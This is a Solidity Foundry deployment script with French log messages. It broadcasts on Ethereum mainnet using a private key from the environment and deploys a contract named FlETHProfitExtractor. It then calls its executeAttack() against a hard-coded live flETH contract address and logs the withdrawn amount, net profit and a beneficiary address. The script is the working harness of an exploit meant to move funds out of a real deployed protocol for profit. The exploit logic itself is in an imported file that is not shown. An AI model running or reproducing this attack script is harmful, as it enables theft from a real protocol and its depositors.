// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Script.sol";
import "../src/FlETHAttackerMainnet_flETH_to_Strategy_3.sol";

contract DeployFlETHToStrategy3Script is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployerPrivateKey);

        console.log("===== FLETH TO STRATEGY - PHASE 3 (AVEC 0.40 ETH RESTANT) =====");
        console.log("Objectif: Transferer ETH de flETH vers Strategy, laisser 0.40 ETH dans flETH");

        // État initial
        IFLETH flETH = IFLETH(0x000000000D564D5be76f7f0d28fE52605afC7Cf8);

        uint256 flETHBalanceBefore = address(flETH).balance;
        uint256 strategyBalanceBefore = flETH.strategy().balanceInETH();
        uint256 totalSupply = flETH.totalSupply();

        console.log("\n[ETAT INITIAL]");
        console.log("flETH balance:", flETHBalanceBefore / 1e18, "ETH");
        console.log("Strategy balance:", strategyBalanceBefore / 1e18, "ETH");
        console.log("Total Supply:", totalSupply / 1e18, "flETH");
        console.log("Total ETH (flETH + Strategy):", (flETHBalanceBefore + strategyBalanceBefore) / 1e18, "ETH");

        // Déployer
        console.log("\n[DEPLOYING]");
        FlETHProfitExtractor attacker = new FlETHProfitExtractor();
        console.log("Contract deployed:", address(attacker));

        // Exécuter l'attaque
        console.log("\n[EXECUTING - 2 ETH TRANSFER]");
        attacker.executeAttack();

        // État final
        uint256 flETHBalanceAfter = address(flETH).balance;
        uint256 strategyBalanceAfter = flETH.strategy().balanceInETH();

        console.log("\n[ETAT FINAL]");
        console.log("flETH balance:", flETHBalanceAfter / 1e18, "ETH");
        console.log("Strategy balance:", strategyBalanceAfter / 1e18, "ETH");
        console.log("Total ETH (flETH + Strategy):", (flETHBalanceAfter + strategyBalanceAfter) / 1e18, "ETH");

        // Vérifications
        console.log("\n[DELTA]");
        int256 flETHDelta = int256(flETHBalanceAfter) - int256(flETHBalanceBefore);
        int256 strategyDelta = int256(strategyBalanceAfter) - int256(strategyBalanceBefore);

        console.log("flETH delta:", flETHDelta < 0 ? "-" : "+", uint256(flETHDelta < 0 ? -flETHDelta : flETHDelta) / 1e18, "ETH");
        console.log("Strategy delta:", strategyDelta < 0 ? "-" : "+", uint256(strategyDelta < 0 ? -strategyDelta : strategyDelta) / 1e18, "ETH");

        // Résultats de l'attaque
        uint256 totalWithdrawn = attacker.totalWithdrawn();
        uint256 netProfit = attacker.netProfit();

        console.log("\n[ATTACK RESULTS]");
        console.log("Total withdrawn:", totalWithdrawn / 1e18, "ETH");
        console.log("Net profit:", netProfit / 1e18, "ETH");

        // Verification finale (target: 0.40 ETH dans flETH)
        uint256 targetBalance = 0.40 ether;
        uint256 tolerance = 0.05 ether; // Tolerance de +/- 0.05 ETH

        if (flETHBalanceAfter >= (targetBalance - tolerance) && flETHBalanceAfter <= (targetBalance + tolerance)) {
            console.log("\n[SUCCESS] flETH balance cible atteinte (~0.40 ETH), ETH transfere vers Strategy!");
            console.log("Target: 0.40 ETH | Actual:", flETHBalanceAfter / 1e18, "ETH");
        } else if (flETHBalanceAfter < flETHBalanceBefore) {
            console.log("\n[PARTIAL] flETH balance reduite mais objectif non atteint");
            console.log("Target: 0.40 ETH | Remaining:", flETHBalanceAfter / 1e18, "ETH");
        } else {
            console.log("\n[FAILED] Aucun transfert detecte");
        }

        console.log("\nBeneficiary:", attacker.BENEFICIARY());

        vm.stopBroadcast();
    }
}
